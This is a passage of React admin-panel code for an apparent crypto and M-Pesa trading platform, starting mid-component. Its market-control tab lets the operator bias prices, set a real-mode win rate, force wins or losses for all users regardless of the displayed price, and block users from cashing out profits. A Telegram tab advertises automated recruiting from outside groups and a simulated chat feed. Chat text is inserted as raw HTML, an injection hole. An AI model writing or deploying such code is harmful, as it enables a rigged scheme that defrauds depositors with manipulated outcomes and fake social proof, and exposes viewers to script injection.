                              <div className="absolute inset-0 bg-black/40 flex items-center justify-center opacity-0 group-hover:opacity-100 transition-opacity">
                                <span className="text-xs font-bold text-white uppercase">View Full Image</span>
                              </div>
                            </a>
                          </div>

                          {d.message && (
                            <div className="space-y-1">
                              <p className="text-[10px] text-slate-400 font-bold uppercase">Transaction Message</p>
                              <div className="bg-slate-950 p-2 rounded border border-slate-700 max-h-24 overflow-y-auto">
                                <p className="text-[10px] text-slate-300 font-mono whitespace-pre-wrap">{d.message}</p>
                              </div>
                            </div>
                          )}

                          <div className="flex gap-2">
                            <button
                              onClick={() => handleProcessDeposit(d.id, 'approve')}
                              className="flex-1 bg-green-600 hover:bg-green-700 text-white font-bold py-2 rounded text-xs uppercase"
                            >
                              Approve
                            </button>
                            <button
                              onClick={() => handleProcessDeposit(d.id, 'decline')}
                              className="flex-1 bg-red-600 hover:bg-red-700 text-white font-bold py-2 rounded text-xs uppercase"
                            >
                              Decline
                            </button>
                          </div>
                        </div>
                      ))}
                    </div>
                  )}
                </div>
              )}

              {activeTab === 'completed_deposits' && (
                <div className="space-y-4">
                  <h3 className="text-lg font-bold">Completed Deposits</h3>
                  {completedDeposits.length === 0 ? (
                    <div className="p-8 text-center text-slate-500 font-bold border border-slate-800 rounded-lg">
                      No completed deposits found.
                    </div>
                  ) : (
                    <div className="overflow-x-auto">
                      <table className="w-full text-left text-sm border-collapse">
                        <thead>
                          <tr className="bg-slate-900 border-b border-slate-800 text-[10px] uppercase text-slate-400 tracking-wider">
                            <th className="p-3 font-bold">User</th>
                            <th className="p-3 font-bold text-right">Amount</th>
                            <th className="p-3 font-bold">Coin/Network</th>
                            <th className="p-3 font-bold">Tx Hash</th>
                            <th className="p-3 font-bold">Date</th>
                          </tr>
                        </thead>
                        <tbody>
                          {completedDeposits.map(d => (
                            <tr key={d.txHash} className="border-b border-slate-800/50 hover:bg-slate-900/30 transition-colors">
                              <td className="p-3 font-mono text-xs max-w-[150px] truncate">{d.userId}</td>
                              <td className="p-3 text-right font-bold text-green-500">${d.amount}</td>
                              <td className="p-3 text-xs">{d.coin} / {d.network}</td>
                              <td className="p-3 font-mono text-[10px] text-slate-500 max-w-[150px] truncate">{d.txHash}</td>
                              <td className="p-3 text-xs">{new Date(d.creditedAt).toLocaleString()}</td>
                            </tr>
                          ))}
                        </tbody>
                      </table>
                    </div>
                  )}
                </div>
              )}

              {activeTab === 'withdrawals' && (
                <div className="space-y-4">
                  <h3 className="text-lg font-bold">Withdrawals</h3>
                  {withdrawals.length === 0 ? (
                    <div className="p-8 text-center text-slate-500 font-bold border border-slate-800 rounded-lg">
                      No withdrawals found.
                    </div>
                  ) : (
                    <div className="overflow-x-auto">
                      <table className="w-full text-left text-sm border-collapse">
                        <thead>
                          <tr className="bg-slate-900 border-b border-slate-800 text-[10px] uppercase text-slate-400 tracking-wider">
                            <th className="p-3 font-bold">User</th>
                            <th className="p-3 font-bold text-right">Amount</th>
                            <th className="p-3 font-bold">Method</th>
                            <th className="p-3 font-bold">Destination</th>
                            <th className="p-3 font-bold">Status</th>
                            <th className="p-3 font-bold">Date</th>
                          </tr>
                        </thead>
                        <tbody>
                          {withdrawals.map(w => (
                            <tr key={w.id} className="border-b border-slate-800/50 hover:bg-slate-900/30 transition-colors">
                              <td className="p-3 font-mono text-xs max-w-[150px] truncate">{w.userId}</td>
                              <td className="p-3 text-right font-bold text-red-500">${w.amount}</td>
                              <td className="p-3 text-xs uppercase">{w.paymentMethod || 'Crypto'} ({w.coin})</td>
                              <td className="p-3 font-mono text-[10px] text-slate-500 max-w-[150px] truncate">{w.address}</td>
                              <td className="p-3 text-[10px] font-bold uppercase">
                                <span className={`px-2 py-1 rounded-full ${w.status === 'pending' ? 'bg-yellow-500/10 text-yellow-500 block w-max' : w.status === 'paid' ? 'bg-green-500/10 text-green-500 block w-max' : 'bg-slate-800 text-slate-400 block w-max'}`}>
                                  {w.status}
                                </span>
                              </td>
                              <td className="p-3 text-xs">{new Date(w.createdAt).toLocaleString()}</td>
                            </tr>
                          ))}
                        </tbody>
                      </table>
                    </div>
                  )}
                </div>
              )}

              {activeTab === 'game' && (
                <div className="max-w-2xl space-y-6">
                  <div className="border border-slate-800 rounded-lg p-6 bg-slate-900 shadow-xl">
                    <h3 className="text-lg font-bold mb-4 flex items-center gap-2 text-yellow-500">
                      <TrendingUp className="h-5 w-5" />
                      Global Market Control
                    </h3>
                    
                    <form onSubmit={handleUpdateGameSettings} className="space-y-6">
                      <div className="space-y-2">
                        <div className="flex justify-between items-center">
                          <label className="text-xs font-bold uppercase text-slate-400">Market Bias (Trend)</label>
                          <span className={`text-xs font-bold ${gameSettings.globalTrendBias > 0 ? 'text-green-500' : gameSettings.globalTrendBias < 0 ? 'text-red-500' : 'text-slate-500'}`}>
                            {gameSettings.globalTrendBias > 0 ? 'Bullish' : gameSettings.globalTrendBias < 0 ? 'Bearish' : 'Neutral'} ({gameSettings.globalTrendBias})
                          </span>
                        </div>
                        <input
                          type="range"
                          min="-0.05"
                          max="0.05"
                          step="0.001"
                          value={gameSettings.globalTrendBias}
                          onChange={(e) => setGameSettings({...gameSettings, globalTrendBias: parseFloat(e.target.value)})}
                          className="w-full h-1.5 bg-slate-800 rounded-lg appearance-none cursor-pointer accent-yellow-500"
                        />
                        <div className="flex justify-between text-[8px] text-slate-600 font-bold uppercase">
                          <span>Heavy Sell</span>
                          <span>Neutral</span>
                          <span>Heavy Buy</span>
                        </div>
                      </div>

                      <div className="space-y-2">
                        <div className="flex justify-between items-center">
                          <label className="text-xs font-bold uppercase text-slate-400">Volatility Multiplier</label>
                          <span className="text-xs font-bold text-white">{gameSettings.volatilityMultiplier}x</span>
                        </div>
                        <input
                          type="range"
                          min="0.5"
                          max="3"
                          step="0.1"
                          value={gameSettings.volatilityMultiplier}
                          onChange={(e) => setGameSettings({...gameSettings, volatilityMultiplier: parseFloat(e.target.value)})}
                          className="w-full h-1.5 bg-slate-800 rounded-lg appearance-none cursor-pointer accent-violet-500"
                        />
                      </div>

                      <div className="space-y-1.5 pt-2 border-t border-slate-800">
                        <div className="flex justify-between items-center">
                          <label className="text-[10px] font-bold uppercase text-slate-400 font-mono tracking-wider">Real Mode Win Rate</label>
                          <span className="text-xs font-bold text-white">{gameSettings.realWinRate ?? 30}%</span>
                        </div>
                        <input 
                          type="range"
                          min="0"
                          max="100"
                          step="1"
                          value={gameSettings.realWinRate ?? 30}
                          onChange={(e) => setGameSettings({...gameSettings, realWinRate: parseInt(e.target.value)})}
                          className="w-full h-1.5 bg-slate-800 rounded-lg appearance-none cursor-pointer accent-emerald-500"
                        />
                      </div>

                      <div className="space-y-2 pt-2 border-t border-slate-800">
                        <label className="text-xs font-bold uppercase text-slate-400">Force Global Outcome</label>
                        <select
                          value={gameSettings.forceOutcome || ''}
                          onChange={(e) => setGameSettings({...gameSettings, forceOutcome: e.target.value as any})}
                          className="w-full bg-slate-950 border border-slate-800 rounded p-2 text-xs font-bold text-white outline-none focus:border-yellow-500 transition-all"
                        >
                          <option value="">No Override (Natural Market)</option>
                          <option value="win">Force WIN for all users</option>
                          <option value="loss">Force LOSS for all users</option>
                        </select>
                        <p className="text-[9px] text-slate-500 italic">
                          Warning: Forcing outcomes will override technical price settlement logic.
                        </p>
                      </div>

                      <div className="space-y-2 pt-2 border-t border-slate-800">
                        <label className="text-xs font-bold uppercase text-slate-400">Early Buyout / Cashout Control</label>
                        <select
                          value={gameSettings.cashoutMode || 'enabled'}
                          onChange={(e) => setGameSettings({...gameSettings, cashoutMode: e.target.value as any})}
                          className="w-full bg-slate-950 border border-slate-800 rounded p-2 text-xs font-bold text-white outline-none focus:border-yellow-500 transition-all"
                        >
                          <option value="enabled">Fully Enabled (Normal Cashout)</option>
                          <option value="disabled">Fully Disabled (Remove Early Cashout)</option>
                          <option value="smart">Smart Buyout Mode (Block Win Lock, Allow Loss Reduction)</option>
                        </select>
                        <p className="text-[9px] text-slate-500 italic">
                          Manage user ability to self-liquidate positions before target expiration: disable entirely or restrict to smart mode (prevents cashing out green profits).
                        </p>
                      </div>

                      <div className="space-y-4 border-t border-slate-800 pt-4">
                        <label className="text-xs font-bold uppercase text-slate-400 block pb-1">Payment Gateways & Limits</label>
                        
                        <div className="grid grid-cols-2 gap-4 flex-row">
                          <label className="flex items-center space-x-2.5 cursor-pointer bg-slate-900/40 p-3 rounded border border-slate-800 hover:border-slate-700 transition-all select-none">
                            <input
                              type="checkbox"
                              checked={gameSettings.paybillEnabled !== false}
                              onChange={(e) => setGameSettings({ ...gameSettings, paybillEnabled: e.target.checked })}
                              className="accent-yellow-500 rounded"
                            />
                            <div className="flex flex-col">
                              <span className="text-xs font-bold text-white">M-Pesa paybill</span>
                              <span className="text-[9px] text-slate-500 font-medium">Toggle manual processing</span>
                            </div>
                          </label>

                          <label className="flex items-center space-x-2.5 cursor-pointer bg-slate-900/40 p-3 rounded border border-slate-800 hover:border-slate-700 transition-all select-none">
                            <input
                              type="checkbox"
                              checked={gameSettings.btcEnabled !== false}
                              onChange={(e) => setGameSettings({ ...gameSettings, btcEnabled: e.target.checked })}
                              className="accent-yellow-500 rounded"
                            />
                            <div className="flex flex-col">
                              <span className="text-xs font-bold text-white">BTC (NOWPayments)</span>
                              <span className="text-[9px] text-slate-500 font-medium">Toggle crypto gateway</span>
                            </div>
                          </label>
                        </div>

                        <div className="grid grid-cols-2 gap-4">
                          <div>
                            <label className="text-[10px] uppercase font-bold text-slate-400 block mb-1">Min Deposit (USD)</label>
                            <input
                              type="number"
                              step="0.01"
                              value={gameSettings.minDeposit !== undefined ? gameSettings.minDeposit : 1.00}
                              onChange={(e) => setGameSettings({ ...gameSettings, minDeposit: parseFloat(e.target.value) || 0.00 })}
                              className="w-full bg-slate-950 border border-slate-800 rounded p-2 text-xs font-bold text-white font-mono outline-none focus:border-yellow-500 transition-all"
                            />
                          </div>

                          <div>
                            <label className="text-[10px] uppercase font-bold text-slate-400 block mb-1">Min Withdrawal (USD)</label>
                            <input
                              type="number"
                              step="0.01"
                              value={gameSettings.minWithdrawal !== undefined ? gameSettings.minWithdrawal : 10.00}
                              onChange={(e) => setGameSettings({ ...gameSettings, minWithdrawal: parseFloat(e.target.value) || 0.00 })}
                              className="w-full bg-slate-950 border border-slate-800 rounded p-2 text-xs font-bold text-white font-mono outline-none focus:border-yellow-500 transition-all"
                            />
                          </div>
                        </div>
                      </div>

                      <div className="space-y-4">
                        <label className="text-xs font-bold uppercase text-slate-400 block border-t border-slate-800 pt-4 mt-2">Community Oversight</label>
                        <div className="flex gap-2">
                          <button
                            type="button"
                            onClick={async () => {
                              try {
                                await fetch('/api/admin/chat/toggle', {
                                  method: 'POST',
                                  headers: { 'Content-Type': 'application/json', 'x-admin-key': adminKey },
                                  body: JSON.stringify({ enabled: true })
                                });
                                alert('Chat Enabled!');
                              } catch(e) {}
                            }}
                            className="flex-1 bg-green-600/20 hover:bg-green-600/40 text-green-500 border border-green-600/50 font-bold py-2 rounded-lg text-xs uppercase"
                          >
                            Enable Global Chat
                          </button>
                          <button
                            type="button"
                            onClick={async () => {
                              try {
                                await fetch('/api/admin/chat/toggle', {
                                  method: 'POST',
                                  headers: { 'Content-Type': 'application/json', 'x-admin-key': adminKey },
                                  body: JSON.stringify({ enabled: false })
                                });
                                alert('Chat Disabled!');
                              } catch(e) {}
                            }}
                            className="flex-1 bg-red-600/20 hover:bg-red-600/40 text-red-500 border border-red-600/50 font-bold py-2 rounded-lg text-xs uppercase"
                          >
                            Disable Global Chat
                          </button>
                        </div>
                      </div>

                      <button
                        type="submit"
                        disabled={isGameLoading}
                        className="w-full bg-gradient-to-r from-yellow-600 to-yellow-600 hover:from-yellow-500 hover:to-yellow-500 text-white font-bold py-3 rounded-lg text-xs uppercase tracking-widest shadow-lg transition-all active:scale-[0.98] disabled:opacity-50"
                      >
                        {isGameLoading ? 'Updating System...' : 'Deploy Global Market Settings'}
                      </button>
                    </form>
                  </div>

                  <div className="p-4 bg-amber-500/5 border border-amber-500/20 rounded-lg">
                    <p className="text-[10px] text-amber-200/80 leading-relaxed">
                      <strong>Admin Protocol:</strong> Changes deployed here affect all active symbols real-time. Market Bias adds drift to the price generation algorithm. Forcing outcomes will manipulate final contract settlements regardless of the visible price at expiration.
                    </p>
                  </div>
                </div>
              )}

              {activeTab === 'telegram' && (
                <div className="space-y-6">
                  <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-2">
                    <h3 className="text-lg font-bold">Telegram Automation & Group Controls</h3>
                    <div className="text-[10px] bg-indigo-50 dark:bg-indigo-950/40 text-indigo-650 dark:text-indigo-400 border border-indigo-200 dark:border-indigo-900/50 px-2 py-1 rounded font-mono">
                      Inviter Core: ACTIVE (Auto-Recruiting from External Guilds)
                    </div>
                  </div>

                  {/* HIGH-LEVEL STATS AND RECRUITING INDICATORS */}
                  <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                    <div className={`p-3.5 rounded-lg border text-left ${theme === 'dark' ? 'bg-slate-900/60 border-slate-800' : 'bg-slate-50 border-gray-200'}`}>
                      <span className="text-[9px] uppercase font-bold text-slate-400 block mb-1">Total Group Members</span>
                      <p className="text-xl font-bold text-indigo-600 dark:text-indigo-400">1,384 Users</p>
                      <span className="text-[8px] text-gray-500 font-medium">Synced last minutes ago</span>
                    </div>
                    <div className={`p-3.5 rounded-lg border text-left ${theme === 'dark' ? 'bg-slate-900/60 border-slate-800' : 'bg-slate-50 border-gray-200'}`}>
                      <span className="text-[9px] uppercase font-bold text-slate-400 block mb-1">Cross-Group Recruited</span>
                      <p className="text-xl font-bold text-emerald-600 dark:text-emerald-400 font-sans">Automatic (24/7)</p>
                      <span className="text-[8px] text-gray-500 font-medium font-sans">Simulating external sweeps</span>
                    </div>
                    <div className={`p-3.5 rounded-lg border text-left ${theme === 'dark' ? 'bg-slate-900/60 border-slate-800' : 'bg-slate-50 border-gray-200'}`}>
                      <span className="text-[9px] uppercase font-bold text-slate-400 block mb-1">Registration Link Pushed</span>
                      <p className="text-xs font-mono font-bold text-amber-500 truncate mt-1">lwex.onrender.com</p>
                      <span className="text-[8px] text-gray-500 font-medium">Inviting members to signup link</span>
                    </div>
                  </div>

                  {/* PINNED NOTIFICATION BANNER */}
                  {telegramConfig?.pinnedMessageId ? (
                    <div className="p-3.5 rounded-lg bg-yellow-500/10 border border-yellow-500/25 text-left flex items-start justify-between gap-4">
                      <div className="space-y-1">
                        <span className="inline-flex items-center gap-1.5 text-[9px] font-black uppercase text-yellow-600 dark:text-yellow-400 tracking-wider">
                          <Pin className="w-3 h-3 animate-pulse" />
                          Announcements Board: Pinned Group Signal
                        </span>
                        <p className="text-xs text-slate-700 dark:text-slate-200 font-medium">
                          <strong>{telegramConfig.pinnedMessageSender}:</strong>{' '}
                          <span dangerouslySetInnerHTML={{ __html: telegramConfig.pinnedMessageText || '' }} />
                        </p>
                      </div>
                      <button
                        onClick={handleUnpinNotification}
                        disabled={isPinning}
                        className="bg-yellow-500 hover:bg-yellow-600 text-slate-950 px-2 py-1.5 rounded text-[9px] font-bold uppercase tracking-wider flex items-center gap-1 cursor-pointer transition-all disabled:opacity-50 whitespace-nowrap border-none"
                      >
                        <PinOff className="w-3 h-3" />
                        Unpin Message
                      </button>
                    </div>
                  ) : (
                    <div className="p-3.5 rounded-lg bg-slate-100/50 dark:bg-zinc-900/40 border border-slate-250 dark:border-zinc-800 text-left text-xs text-slate-500">
                      📌 No announcement currently pinned. Click any "Pin Notification" button below to highlight a key signal to all members instantly!
                    </div>
                  )}

                  <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                    {/* LEFT PANEL: GROUP CHAT FEED WITH PIN BUTTON */}
                    <div className={`p-4 rounded-xl border text-left flex flex-col h-[380px] ${theme === 'dark' ? 'border-slate-800 bg-slate-900/50' : 'border-gray-200 bg-white'}`}>
                      <h4 className="text-xs font-bold text-slate-500 uppercase tracking-wider mb-3 flex items-center gap-1.5">
                        <MessageSquare className="w-4 h-4 text-indigo-500" />
                        Live Simulated Group Chat Feed
                      </h4>

                      <div className="flex-1 overflow-y-auto space-y-2.5 pr-1 scrollbar-thin">
                        {tgLogs.length === 0 ? (
                          <div className="text-center py-12 text-slate-400 text-xs italic">
                            Waiting for simulated group events...
                          </div>
                        ) : (
                          tgLogs.slice(-25).reverse().map((log) => {
                            const isPinned = telegramConfig?.pinnedMessageId === log.id;
                            const isBot = log.sender === 'Wizard Bot' || log.sender === 'System Manager' || log.sender === 'System Admin';

                            return (
                              <div 
                                key={log.id} 
                                className={`p-2.5 rounded border transition-all ${
                                  isPinned 
                                    ? 'bg-yellow-500/10 border-yellow-500/30 font-medium shadow-sm' 
                                    : isBot
                                      ? 'bg-indigo-500/5 border-indigo-500/10'
                                      : 'bg-slate-50 dark:bg-zinc-900/40 border-slate-150 dark:border-zinc-800/80'
                                }`}
                              >
                                <div className="flex items-center justify-between gap-2 mb-1">
                                  <span className="font-mono text-[9px] font-bold text-indigo-650 dark:text-indigo-400">
                                    {log.sender}
                                  </span>
                                  <div className="flex items-center gap-1.5 select-none">
                                    <span className="text-[8px] text-gray-400 font-mono">
                                      {new Date(log.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
                                    </span>
                                    {isPinned ? (
                                      <span className="bg-yellow-500/20 text-yellow-600 dark:text-yellow-400 border border-yellow-500/30 text-[8px] font-extrabold px-1 py-0.2 rounded flex items-center">
                                        PINNED
                                      </span>
                                    ) : (
                                      <button
                                        onClick={() => handlePinNotification(log.id)}
                                        disabled={isPinning}
                                        className="bg-indigo-600 hover:bg-indigo-700 text-white text-[8px] font-extrabold px-1.5 py-0.5 rounded transition-all cursor-pointer opacity-70 hover:opacity-100 border-none"
                                      >
                                        Pin Notification
                                      </button>
                                    )}
                                  </div>
                                </div>
                                <p className="text-[10px] leading-relaxed text-slate-700 dark:text-slate-300" dangerouslySetInnerHTML={{ __html: log.text }} />
                              </div>
                            );
                          })
                        )}
                      </div>
                    </div>

                    {/* RIGHT PANEL: MEMBER GROWTH CHART */}
                    <div className={`p-4 rounded-xl border text-left flex flex-col h-[380px] ${theme === 'dark' ? 'border-slate-800 bg-slate-900/50' : 'border-gray-200 bg-white'}`}>
                      <h4 className="text-xs font-bold text-slate-500 uppercase tracking-wider mb-4">Telegram Group Member Growth</h4>
                      <div className="flex-1">
                        <ResponsiveContainer width="100%" height="100%">
                          <BarChart data={telegramGrowthData} margin={{ top: 10, right: 10, left: -20, bottom: 0 }}>
                            <CartesianGrid strokeDasharray="3 3" vertical={false} stroke={theme === 'dark' ? '#334155' : '#e2e8f0'} />
                            <XAxis dataKey="date" axisLine={false} tickLine={false} tick={{ fontSize: 9, fill: theme === 'dark' ? '#94a3b8' : '#64748b' }} minTickGap={30} />
                            <YAxis axisLine={false} tickLine={false} tick={{ fontSize: 9, fill: theme === 'dark' ? '#94a3b8' : '#64748b' }} />
                            <Tooltip contentStyle={{ backgroundColor: theme === 'dark' ? '#0f172a' : '#fff', borderColor: theme === 'dark' ? '#1e293b' : '#e2e8f0', borderRadius: '8px', fontSize: '10px' }} />
                            <Bar dataKey="newMembers" fill="#6366f1" radius={[4, 4, 0, 0]} />
                          </BarChart>
                        </ResponsiveContainer>
                      </div>
                    </div>
                  </div>
                </div>
              )}
            </div>

            <button
              onClick={() => {
                setIsAuthenticated(false);
                setAdminKey('');
              }}
              className="bg-slate-500 hover:bg-slate-600 text-white font-bold py-2 px-4 rounded transition-all"
            >
              Logout
            </button>
          </>
        )}
      </div>
    </div>
  );
}
